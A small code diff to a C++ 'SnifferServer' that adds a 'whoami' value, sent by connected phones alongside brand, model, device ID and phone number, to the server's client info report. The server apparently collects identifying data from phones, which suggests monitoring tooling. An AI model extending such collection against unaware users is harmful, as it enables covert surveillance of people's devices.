@@ -829,6 +829,7 @@ void SnifferServer::OnParseCmd(Client* client, SCMD* scmd) {
 		        client->brand = rootRecv[PHONE_INFO_BRAND].asString();
 		        client->model = rootRecv[PHONE_INFO_MODEL].asString();
 		        client->phoneNumber = rootRecv[PHONE_INFO_NUMBER].asString();
+		        client->whoami = rootRecv[PHONE_INFO_WHOAMI].asString();
 
 				LogManager::GetLogManager()->Log(
 						LOG_MSG,
@@ -1199,6 +1200,11 @@ int SnifferServer::GetClientInfo(
 			result += DEVICE_ID;
 			result += " : ";
 			result += client->deviceId;
+			result += "\n";
+
+			result += "WHOAMI";
+			result += " : ";
+			result += client->whoami;
 			result += "\n";
 
 			result += "手机厂商";
